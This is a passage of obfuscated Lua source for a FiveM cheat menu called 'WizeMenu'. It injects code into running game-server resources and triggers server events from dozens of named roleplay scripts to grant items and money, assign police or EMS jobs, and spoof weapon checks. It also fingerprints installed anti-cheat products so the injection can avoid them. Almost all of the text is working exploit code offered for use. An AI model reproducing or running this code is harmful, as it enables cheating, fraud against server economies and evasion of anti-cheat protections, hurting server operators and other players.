(v268.id=="jim_bakery") then local v487=0 -0 ;while true do if (v487==0) then v69(('pcall(function() TriggerServerEvent("jim-bakery:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="jim_beanmachine") then local v488=0;while true do if ((0 -0)==v488) then v69(('pcall(function() TriggerServerEvent("jim-beanmachine:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="jim_burgershot") then local v489=0;while true do if (v489==0) then v69(('pcall(function() TriggerServerEvent("jim-burgershot:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="jim_catcafe") then local v490=0 + 0 ;while true do if (0==v490) then v69(('pcall(function() TriggerServerEvent("jim-catcafe:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="jim_consumables") then local v491=0 -0 ;while true do if (v491==(1898 -(41 + 1857))) then v69(('pcall(function() TriggerServerEvent("jim-consumables:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="jim_mechanic") then local v492=1893 -(1222 + 671) ;while true do if (v492==0) then v69(('pcall(function() TriggerServerEvent("jim-mechanic:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="jim_mining") then local v493=0 -0 ;while true do if (v493==0) then v69(('pcall(function() TriggerServerEvent("jim-mining:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="jim_pizzathis") then v69(('pcall(function() TriggerServerEvent("jim-pizzathis:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;elseif (v268.id=="jim_recycle") then local v494=0 -0 ;while true do if (0==v494) then v69(('pcall(function() TriggerServerEvent("jim-recycle:server:toggleItem", true, "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="jim_shops_blackmarket") then local v495=0;while true do if (v495==(1182 -(229 + 953))) then v69(('pcall(function() Config.Goodies = { label = "Blackmarket", slots = 1, items = { [1] = { name = "%s", price = 0, amount = %d, info = {}, type = "item", slot = 1 } } } end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="jim_shops_open") then local v496=0;while true do if (v496==0) then v69('pcall(function() TriggerServerEvent("jim-shops:ShopOpen", "shop", "illegalshit", Config.Goodies) end)');v242=true;break;end end elseif (v268.id=="kaves_drugsv2") then local v497=1774 -(1111 + 663) ;while true do if (v497==(1579 -(874 + 705))) then v69(('pcall(function() TriggerServerEvent("kaves_drugsv2:server:giveItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="mt_restaurants") then local v498=0 + 0 ;while true do if (v498==0) then v69(('pcall(function() TriggerServerEvent("mt-restaurants:server:AddItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="mt_printers") then v69(('pcall(function() TriggerServerEvent("__ox_cb_mt_printers:server:itemActions", "mt_printers", "mt_printers:server:itemActions:codeplug", "%s", "add") end)'):format(v332));v242=true;elseif (v268.id=="nx_cayo") then local v499=0 + 0 ;while true do if ((0 -0)==v499) then v69(('pcall(function() TriggerServerEvent("nx-cayo:server:AddItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="okok_crafting") then local v500=0 + 0 ;while true do if ((679 -(642 + 37))==v500) then v69(('pcall(function() TriggerServerEvent("okokCrafting:claimAll", "paletogeneral", { ["paletogeneral"] = { [1] = { ["item"] = "%s", ["randomID"] = 431916296, ["recipe"] = { [1] = { [1] = "cash", [2] = 1, [3] = "true", [4] = "false" } }, ["suc"] = true, ["xp"] = 6, ["itemName"] = "Pistol", ["time"] = 0, ["amount"] = %d, ["isPending"] = false, ["isDone"] = true, ["isItem"] = true, ["isDis"] = false, ["sucPC"] = 85 } } }) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="pug_business_creator") then v69(('pcall(function() TriggerServerEvent("Pug:server:NewGivBusinessItemAfterHacks", true, "%s", %d) end)'):format(v332,v333));v242=true;elseif (v268.id=="pug_chopping") then local v501=0 + 0 ;while true do if (v501==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("Pug:server:GiveChoppingCarPay", %d) end)'):format(v333));v242=true;break;end end elseif (v268.id=="pug_fishing") then v69(('pcall(function() TriggerServerEvent("Pug:server:GiveFish", "%s", %d) end)'):format(v332,v333));v242=true;elseif (v268.id=="pug_robbery_creator") then local v502=0 -0 ;while true do if (v502==(454 -(233 + 221))) then v69(('pcall(function() TriggerServerEvent("Pug:server:RobberyGiveItem", true, "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="qb_crafting") then local v503=0 -0 ;while true do if (v503==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("qb-crafting:server:receiveItem", "%s", {}, %d, 0) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="qb_drugs") then local v504=1541 -(718 + 823) ;while true do if (v504==0) then v69(('pcall(function() TriggerServerEvent("qb-drugs:server:giveDrugs", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="qb_garbage_job") then local v505=0 + 0 ;while true do if (v505==0) then v69(('pcall(function() TriggerServerEvent("qb-garbagejob:server:PayShift", %d, "") end)'):format(v333));v242=true;break;end end elseif (v268.id=="qb_hotdog_job") then local v506=0;while true do if (v506==(805 -(266 + 539))) then v69(('pcall(function() local ped = GetPlayerPed(-1) local pedCoords = GetEntityCoords(ped) local HotdogsForSale = 1 local SellingPrice = %d TriggerServerEvent("qb-hotdogjob:server:Sell", pedCoords, HotdogsForSale, SellingPrice) end)'):format(v333));v242=true;break;end end elseif (v268.id=="qb_recycle_job") then local v507=0 -0 ;while true do if (v507==0) then v69(('pcall(function() TriggerServerEvent("recycle:giveReward", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="qb_trash_search") then local v508=1225 -(636 + 589) ;while true do if (v508==(0 -0)) then v69(('pcall(function() TriggerServerEvent("qb-trashsearch:server:givemoney", math.random(%d, 9999999999999999)) end)'):format(v333));v242=true;break;end end elseif (v268.id=="qb_warehouse") then local v509=0 -0 ;while true do if (v509==0) then v69(('pcall(function() TriggerServerEvent("inside-warehouse:Payout", %d) end)'):format(v333));v242=true;break;end end elseif (v268.id=="rm_camperv") then local v510=0 + 0 ;while true do if (v510==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("camperv:server:giveItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="ry_rent") then local v511=1015 -(657 + 358) ;while true do if (v511==0) then v69(('pcall(function() TriggerServerEvent("ry-vehiclerental:giveMoney", %d) end)'):format(v333));v242=true;break;end end elseif (v268.id=="savana_trucker") then local v512=0 -0 ;while true do if (v512==(0 -0)) then v69(('pcall(function() TriggerServerEvent("savana-truckerJob:addXpAndMoney", %d, %d) end)'):format(v333,v333));v242=true;break;end end elseif (v268.id=="sayer_jukebox") then local v513=1187 -(1151 + 36) ;while true do if (v513==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("sayer-jukebox:AddItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="sell_usb") then local v514=0 + 0 ;while true do if (0==v514) then v69(('pcall(function() TriggerEvent("sell_usb:findClient", { i = 8, label = "CodePlugRunsYourShit", type = "codeplug", zone = "The Meat Quarter", price = %d, count = 0 }) end)'):format(v333));v242=true;break;end end elseif (v268.id=="snipe_boombox") then local v515=0 -0 ;while true do if (v515==(1832 -(1552 + 280))) then v69(('pcall(function() TriggerServerEvent("snipe-boombox:server:pickup", %d, vector3(0.0, 0.0, 0.0), "%s") end)'):format(v333,v332));v242=true;break;end end elseif (v268.id=="solos_cashier") then local v516=834 -(64 + 770) ;while true do if (v516==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("solos-cashier:server:addmoney", "bank", %d) end)'):format(v333));v242=true;break;end end elseif (v268.id=="solos_food") then local v517=0 -0 ;while true do if (v517==0) then v69(('pcall(function() TriggerServerEvent("solos-food:server:itemadd", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="solos_hookah") then local v518=0 + 0 ;while true do if ((1243 -(157 + 1086))==v518) then v69(('pcall(function() TriggerServerEvent("solos-hookah:server:Buy-Item", "%s", %d, 0) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="solos_jointroll") then local v519=0;while true do if (v519==(0 -0)) then v69(('pcall(function() TriggerServerEvent("solos-jointroll:server:ItemAdd", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="solos_joints") then local v520=0;while true do if (v520==(0 -0)) then v69(('pcall(function() TriggerServerEvent("solos-joints:server:itemadd", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="solos_methlab") then local v521=0 -0 ;while true do if (v521==(0 -0)) then v69(('pcall(function() TriggerServerEvent("solos-methlab:server:itemadd", "%s", %d, true) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="solos_moneywash") then local v522=0;while true do if (v522==(819 -(599 + 220))) then v69(('pcall(function() TriggerServerEvent("solos-moneywash:server:ItemAdd", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="solos_restaurants") then local v523=0;while true do if (0==v523) then v69(('pcall(function() TriggerServerEvent("solos-food:server:itemadd", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="t1ger_gangsystem") then v69(('pcall(function() TriggerServerEvent("t1ger_lib:server:addItem", "%s", %d, "codeplugrunsu") end)'):format(v332,v333));v242=true;elseif (v268.id=="t1ger_lib") then local v524=0 -0 ;while true do if (v524==(1931 -(1813 + 118))) then v69(('pcall(function() TriggerServerEvent("t1ger_lib:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="zat_weed") then local v525=0 + 0 ;while true do if (v525==(1217 -(841 + 376))) then v69(('pcall(function() TriggerServerEvent("zat-weed:server:AddItem", "%s", nil, %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="zat_farming") then local v526=0 -0 ;while true do if (v526==0) then v69(('pcall(function() TriggerServerEvent("zat-farming:server:GiveItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="xmmx_letscookplus") then local v527=0;while true do if (v527==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("xmmx_letscookplus:server:BuyItems", { totalCost = 0, cart = { { name = "%s", quantity = %d } } }, "bank") end)'):format(v332,v333));v242=true;break;end end end if v242 then MachoMenuNotification("WizeMenu","Trigger Worked, Enjoy! Using: "   .. v268.name ,13 -8 );break;end end end if  not v242 then local v297={["qb-uwujob"]=function() MachoInjectResource2(862 -(464 + 395) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                    local function aswdaw4atsdf()
                        TriggerServerEvent("qb-uwujob:addItem", "]]   .. v238   .. [[", ]]   .. v239   .. [[)
                    end
                    aswdaw4atsdf()
                ]] );end,skirpz_drugplug=function() MachoInjectResource2(7 -4 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    local function fawfafffsfzxfzx()
                        XTYZ = CreateThread
                        XTYZ(function()
                            for i = 1, ]]   .. v239   .. [[ do
                                local dealer = "shop" .. math.random(1000,9999)
                                TriggerServerEvent = TriggerServerEvent
                                TriggerServerEvent('shop:purchaseItem', shop, ']]   .. v238   .. [[', 0)
                                Wait(100)
                            end
                        end)
                    end
                    fawfafffsfzxfzx()
                ]] );end,ak47_whitewidowv2=function() MachoInjectResource2(3,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    local function aXj49WqTpL()
                        local keyName = "ak47_whitewidowv2:process"
                        TriggerServerEvent(keyName, "]]   .. v238   .. [[", {money = 0}, ]]   .. v239   .. [[, 0)
                    end
                    aXj49WqTpL()
                ]] );end,ak47_business=function() MachoInjectResource2(2 + 1 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    local function agjw37257gj()
                        local keyName = "ak47_business:processed"
                        TriggerServerEvent(keyName, "]]   .. v238   .. [[", ]]   .. v239   .. [[)
                    end
                    agjw37257gj()
                ]] );end,ars_hunting=function() MachoInjectResource2(840 -(467 + 370) ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    local function ZqMwLpTrYv()
                        local keyName = "ars_hunting:sellBuyItem"
                        TriggerServerEvent(keyName, { buy = true, item = "]]   .. v238   .. [[", price = 0, quantity = ]]   .. v239   .. [[ })
                    end
                    ZqMwLpTrYv()
                ]] );end,fivecode_camping=function() MachoInjectResource2(5 -2 ,(v48("monitor") and "monitor") or "any" ,[[
                    local function GnRtCvXpKa()
                        local keyName = 'fivecode_camping:callCallback'
                        local KeyNameParams = 'fivecode_camping:shopPay'
                        TriggerServerEvent(keyName, KeyNameParams, 0, {
                            ['price'] = 0,
                            ['item'] = "]]   .. v238   .. [[",
                            ['amount'] = ]]   .. v239   .. [[,
                            ['label'] = 'WizeMenu'
                        }, {
                            ['args'] = {
                                ['payment'] = {
                                    ['bank'] = true,
                                    ['cash'] = true
                                }
                            },
                            ['entity'] = 9218,
                            ['distance'] = 0.64534759521484,
                            ['hide'] = false,
                            ['type'] = 'bank',
                            ['label'] = 'Open Shop',
                            ['coords'] = 'vector3(-773.2181, 5597.66, 33.97217)',
                            ['name'] = 'npcShop-vec4(-773.409973, 5597.819824, 33.590000, 172.910004)'
                        })
                    end
                    GnRtCvXpKa()
                ]] );end,spoodyGunPlug=function() MachoInjectResource2(3 + 0 ,(v48("spoodyGunPlug") and "spoodyGunPlug") or "any" ,[[
                    local function GnRtCvXpKa()
                        common:giveItem({ { item = "]]   .. v238   .. [[", amount = ]]   .. v239   .. [[ } })  
                    end
                    GnRtCvXpKa()
                ]] );end,["solos-weedtable"]=function() MachoInjectResource2(10 -7 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    local function aqrqtsgw32w523w()
                        local keyName = "solos-weed:server:itemadd"
                        TriggerServerEvent(keyName, "]]   .. v238   .. [[", ]]   .. v239   .. [[)
                    end
                    aqrqtsgw32w523w()
                ]] );end};local v298=false;for v334,v335 in pairs(v297) do if (GetResourceState(v334)=="started") then local v372=0 + 0 ;while true do if (0==v372) then v335();v298=true;break;end end end end if  not v298 then MachoMenuNotification("[NOTIFICATION] WizeMenu","No Triggers Found.");end end end);MachoMenuButton(v46[2],"Police Job",function() local v243=0 -0 ;while true do if (0==v243) then if  not v7() then return;end if v48("wasabi_multijob") then MachoInjectResource("wasabi_multijob",[[
           local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
           TriggerEvent('esx:setJob',)
        ]]);else MachoMenuNotification("[NOTIFICATION] WizeMenu","Resource Not Found.");end break;end end end);MachoMenuButton(v46[522 -(150 + 370) ],"EMS Job",function() local v244=1282 -(74 + 1208) ;while true do if (v244==(0 -0)) then if  not v7() then return;end if v48("wasabi_multijob") then MachoInjectResource("wasabi_multijob",[[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic" }
            TriggerServerEvent('wasabi_multijob:addJob', job)
        ]]);else MachoMenuNotification("[NOTIFICATION] WizeMenu","Resource Not Found.");end break;end end end);MachoMenuButton(v46[14 -11 ],"Spoofed Weapon Bypass",function() local v245=0 + 0 ;local v246;local v247;while true do if (0==v245) then v246=[[
            _G.GetCurrentPedWeapon = function() return -1569615261 end
            _G.IsPedSwappingWeapon = function() return false end
            _G.GetSelectedPedWeapon = function() return -1569615261 end
            _G.GetWeapontypeGroup = function() return -1569615261 end
            _G.IsPedArmed = function() return false end
            _G.HasPedGotWeapon = function() return false end
            _G.IsPedShooting = function() return false end
            _G.WasPedShooting = function() return false end
            _G.RemoveAllPedWeapons = function() return false end
            _G.RemoveWeaponFromPed = function() return false end
            _G.IsPedDoingDriveby = function() return false end
            _G.IsPedSwitchingWeapon = function() return false end
            _G.GetBestPedWeapon = function() return -1569615261 end
            _G.GetAmmoInPedWeapon = function() return 0 end
            _G.GetPedAmmoTypeFromWeapon = function() return 0 end
            _G.GetCurrentPedWeaponEntityIndex = function() return -1 end
            _G.GetPedAmmoTypeFromWeapon_2 = function() return 0 end
            _G.GetWeapontypeModel = function() return -1569615261 end
            _G.GetEntityType = function() return 0 end
            _G.GetEntityAttachedTo = function() return false end
            _G.GetWeaponNameFromHash = function() return -1569615261 end
            _G.IsPedReloading = function() return false end
        ]];v247=nil;v245=1;end if (v245==(391 -(14 + 376))) then function v247() local v356=CreateThread;v356(function() for v382=0,GetNumResources() -1  do local v383=GetResourceByFindIndex(v382);if (v383 and (GetResourceState(v383)=="started")) then local v411=0 -0 ;while true do if (v411==0) then MachoInjectResource(v383,string.format([[
                            print("[ JTG ] - Resource Name: %s")
                            %s
                        ]],v383,v246));Wait(130 + 70 );break;end end end end end);end break;end end end);MachoMenuButton(v47[1 + 0 ],"Uninject",function() local v248=0;while true do if (v248==(1 + 0)) then MachoMenuDestroy(v20);break;end if ((0 -0)==v248) then MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            Stopped = true
        ]]);MachoInjectResource((v48("core") and "core") or (v48("es_extended") and "es_extended") or (v48("qb-core") and "qb-core") or (v48("monitor") and "monitor") or "any" ,[[
            anvzBDyUbl = false
            if fLwYqKoXpRtB then fLwYqKoXpRtB() end
            kLpMnBvCxZqWeRt = false
        ]]);v248=1;end end end);MachoMenuCheckbox(v47[2 + 0 ],"RGB Menu",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if FmxmAlwkjfsfmaW == nil then FmxmAlwkjfsfmaW = false end
            FmxmAlwkjfsfmaW = true

            local function CreateRGBUI()
                local wfgsmWAEJKF = CreateThread
                wfgsmWAEJKF(function()
                    local offset = 0.0
                    while FmxmAlwkjfsfmaW and not Unloaded do
                        offset = offset + 0.065
                        local r = math.floor(127 + 127 * math.sin(offset))
                        local g = math.floor(127 + 127 * math.sin(offset + 2))
                        local b = math.floor(127 + 127 * math.sin(offset + 4))
                        MachoMenuSetAccent(MenuWindow, r, g, b)
                        Wait(25)
                    end
                end)
            end

            CreateRGBUI()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            FmxmAlwkjfsfmaW = false
        ]]);end);local v70,v71,v72=285 -(23 + 55) ,37 -21 ,32;MachoMenuSlider(v47[2],"R",v70,0 + 0 ,229 + 26 ,"",0 -0 ,function(v249) v70=v249;MachoMenuSetAccent(v20,math.floor(v70),math.floor(v71),math.floor(v72));end);MachoMenuSlider(v47[1 + 1 ],"G",v71,901 -(652 + 249) ,682 -427 ,"",0,function(v250) local v251=1868 -(708 + 1160) ;while true do if (v251==(0 -0)) then v71=v250;MachoMenuSetAccent(v20,math.floor(v70),math.floor(v71),math.floor(v72));break;end end end);MachoMenuSlider(v47[2],"B",v72,0 -0 ,282 -(10 + 17) ,"",0,function(v252) local v253=0;while true do if (v253==(0 + 0)) then v72=v252;MachoMenuSetAccent(v20,math.floor(v70),math.floor(v71),math.floor(v72));break;end end end);MachoMenuButton(v47[1735 -(1400 + 332) ],"Anti-Cheat Checker",function() local function v254(v270,...) MachoMenuNotification("[NOTIFICATION] JTG Menu",string.format(v270,...));end local function v255(v271,v272) local v273=0 -0 ;local v274;while true do if (v273==(1908 -(242 + 1666))) then v274=LoadResourceFile(v271,v272);return v274~=nil ;end end end local v256=GetNumResources();local v257={{name="ai_module_fg-obfuscated.lua",acName="FiveGuard"}};for v275=0 + 0 ,v256-(1 + 0)  do local v276=940 -(850 + 90) ;local v277;local v278;local v279;while true do if (v276==(0 -0)) then v277=GetResourceByFindIndex(v275);v278=string.lower(v277);v276=1391 -(360 + 1030) ;end if (v276==(2 + 0)) then if (v278:sub(1,7)=="reaperv") then v279="ReaperV4";elseif (v278:sub(2 -1 ,5 -1 )=="fini") then v279="FiniAC";elseif (v278:sub(1662 -(909 + 752) ,1230 -(109 + 1114) )=="chubsac") then v279="ChubsAC";elseif (v278:sub(1,10 -4 )=="fireac") then v279="FireAC";elseif (v278:sub(1 + 0 ,7)=="drillac") then v279="DrillAC";elseif (v278:sub( -(249 -(6 + 236)))=="eshield") then v279="WaveShield";elseif (v278:sub( -10)=="likizao_ac") then v279="Likizao-AC";elseif (v278:sub(1 + 0 ,5 + 0 )=="greek") then v279="GreekAC";elseif (v278=="pac") then v279="PhoenixAC";elseif (v278=="electronac") then v279="ElectronAC";end if v279 then v254("Anti-Cheat: %s",v279);AntiCheat=v279;return v277,v279;end break;end if (v276==1) then for v373,v374 in ipairs(v257) do if v255(v277,v374.name) then local v401=0 -0 ;while true do if (v401==(1 -0)) then return v277,v374.acName;end if (v401==(1133 -(1076 + 57))) then v254("Anti-Cheat: %s",v374.acName);AntiCheat=v374.acName;v401=1;end end end end v279=nil;v276=1 + 1 ;end end end v254("No Anti-Cheat found");return nil,nil;end);MachoMenuButton(v47[692 -(579 + 110) ],"Framework Checker",function() local v258=0 + 0 ;local v259;local v260;local v261;local v262;local v263;while true do if (v258==(3 + 0)) then function v262() local v357=0 + 0 ;while true do if (v357==(408 -(174 + 233))) then return "Standalone";end if (v357==0) then for v412,v413 in ipairs(v261) do for v421,v422 in ipairs(v413.globals) do if (_G[v422]~=nil) then return v413.label;end end end for v414,v415 in ipairs(v261) do for v423,v424 in ipairs(v415.resources) do if v260(v424) then return v415.label;end end end v357=1;end end end v263=v262();v258=4;end if (v258==(0 -0)) then v259=nil;function v259(v358,...) MachoMenuNotification("[NOTIFICATION] JTG Menu",string.format(v358,...));end v258=1 -0 ;end if (v258==(1 + 1)) then v261={{label="ESX",globals={"ESX"},resources={"es_extended","esx-legacy"}},{label="QBCore",globals={"QBCore"},resources={"qb-core"}},{label="Qbox",globals={},resources={"qbox"}},{label="QBX Core",globals={},resources={"qbx-core"}},{label="ox_core",globals={"Ox"},resources={"ox_core"}},{label="ND_Core",globals={"NDCore"},resources={"nd-core","ND_Core"}},{label="vRP",globals={"vRP"},resources={"vrp"}}};v262=nil;v258=2 + 1 ;end if (1==v258) then v260=nil;function v260(v359) return GetResourceState(v359)=="started" ;end v258=7 -5 ;end if (v258==(1560 -(655 + 901))) then v259("Framework: %s",v263);break;end end end);local v54=0 + 0 ;local v55={[0 + 0 ]={name="Default",hash="MP_F_Freemode"},[1]={name="Gangster",hash="Gang1H"},[2 + 0 ]={name="Wild",hash="GangFemale"},[11 -8 ]={name="Red Neck",hash="Hillbilly"}};